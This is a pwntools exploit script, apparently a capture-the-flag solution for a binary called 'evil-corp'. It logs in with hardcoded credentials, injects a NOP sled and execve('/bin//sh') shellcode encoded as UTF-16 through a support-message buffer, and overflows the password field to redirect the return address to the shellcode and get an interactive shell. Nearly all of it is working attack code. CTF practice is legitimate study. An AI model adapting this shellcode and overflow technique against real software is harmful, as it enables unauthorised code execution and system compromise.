#!/usr/bin/python3

from pwn import *

exe = ELF("./evil-corp_patched")

context.binary = exe

context.terminal = ['tmux', 'splitw', '-h', '-p', '50', '-I']
context.log_level 	= "DEBUG"
isDebug = False

# brva 0x0000000000001678   when comparing username to eliot
# brva 0x0000000000001759   ContactSupport function
# brva 0x0000000000001795   Getting data to inputBuffer in ContactSupport
# brva 0x000000000000155D   Login function
# brva 0x0000000000001669   when getting input for password
# brva 0x00000000000016BF   before returning from Login func
# brva 0x00000000000017A9   wcharToChar16 function call

gs = '''
brva 0x0000000000001669
brva 0x00000000000016BF
brva 0x0000000000001795
brva 0x00000000000017A9
continue
'''.format(**locals())

def start_local(isDebug, argv=[], *a, **kw):
	if args.GDB or isDebug:
		return gdb.debug([exe.path], gdbscript=gs)
	else:
		return process([exe.path], *a, **kw)
		
def find_ip_offset(payload):
	io = process(elf.path)
	io.sendlineafter(b": ", payload)
	
	io.wait()
	
	#ip_offset = cyclic_find(io.corefile.pc) # x86
	ip_offset = cyclic_find(io.corefile.read(io.corefile.sp, 4))
	info("Located RIP offset at [%s]", ip_offset)
	return ip_offset

def wide_cyclic(desired_len_bytes):
    # Generate a normal cyclic pattern of half the desired length in bytes,
    # since we're translating to 2-byte characters.
    pattern_length = desired_len_bytes // 2
    pattern = cyclic(pattern_length)
    
    # Convert each byte in the pattern to a 2-byte (wide) character
    wide_pattern = b''.join(p16(byte) for byte in pattern)
    return wide_pattern

def generate_unicode_payload(content):
    # Ensure the content length is even for proper chunking into 2-byte sequences
    if len(content) % 2 != 0:
        print("Content length adjusted to be even for proper Unicode conversion.")
        content += b'\x00'  # Padding with a null byte if necessary

    # Initialize an empty payload string
    unicode_payload = ""

    # Convert each 2 bytes to Unicode format
    for i in range(0, len(content), 2):
        # Extract two bytes and format them as a little-endian word
        word = content[i] + (content[i + 1] << 8)
        # Convert the word into a Unicode character and append to the payload
        unicode_payload += chr(word)

    # Encode the string using UTF-16LE to get the raw bytes
    # and then decode back to get a proper Python Unicode string with escape sequences
    return unicode_payload.encode('utf-8').decode('unicode_escape')
		
#===========================================================
#                    EXPLOIT GOES HERE					   #
#===========================================================

######## LOCAL ########
#ip_offset = find_ip_offset(cyclic(200))
#ip_offset = 56

# io = remote("94.237.49.166", 45691)
io = start_local(isDebug)
io.timeout = 0.1

# Login...
io.sendlineafter(b"Username: ", b"eliot")
io.sendlineafter(b"Password: ", b"4007")

# # Send support overflow with shell code in 0x11000
io.sendlineafter(b">> ", b"2")

exploit = b"\x90" * (4096)
buf = b"\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x48\x89\xe6\x0f\x05"
payload = exploit + buf
final_payload = generate_unicode_payload(payload)
io.sendline(final_payload)

# # Logout
io.sendlineafter(b">> ", b"3")

# # Overflow password field to overwrite rip and reach 0x10000 or 0x11000 which should execute the payload
return_to = "\U00011000\u0000" * 87 # <-- this overwrites return address from login() with 0x11000
io.sendlineafter(b"Username: ", b"eliot")
io.sendlineafter(b"Password: ", return_to.encode())
io.interactive()
